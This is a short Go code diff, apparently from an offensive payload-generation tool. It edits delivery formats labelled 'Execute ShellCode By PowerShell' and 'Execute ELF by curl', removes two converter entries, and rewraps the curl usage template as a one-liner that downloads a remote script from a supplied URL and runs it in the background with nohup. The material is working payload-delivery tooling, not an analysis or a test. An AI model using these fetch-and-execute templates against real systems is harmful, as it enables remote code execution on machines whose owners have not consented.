@@ -87,13 +87,11 @@ var SupportedFormats = Formatter{
 	},
 	consts.FormatPowerShellRemote: {
 		Extension: ".ps1", Desc: "Execute ShellCode By PowerShell",
-		Converter:     toPowershellRemote,
 		SupportRemote: true,
 		Usage:         PowershellRemoteUsage,
 	},
 	consts.FormatCurlRemote: {
 		Extension: ".bash", Desc: "Execute ELF by curl",
-		Converter:     toPowershellRemote,
 		SupportRemote: true,
 		Usage:         CurlRemoteUsage,
 	},
@@ -471,7 +469,7 @@ func PowershellRemoteUsage(powershellURL string) string {
 }
 
 func CurlRemoteUsage(url string) string {
-	template := `curl %s | nohup bash &`
+	template := `sh -c "curl %s | nohup bash &"`
 	return fmt.Sprintf(template, url)
 }
 
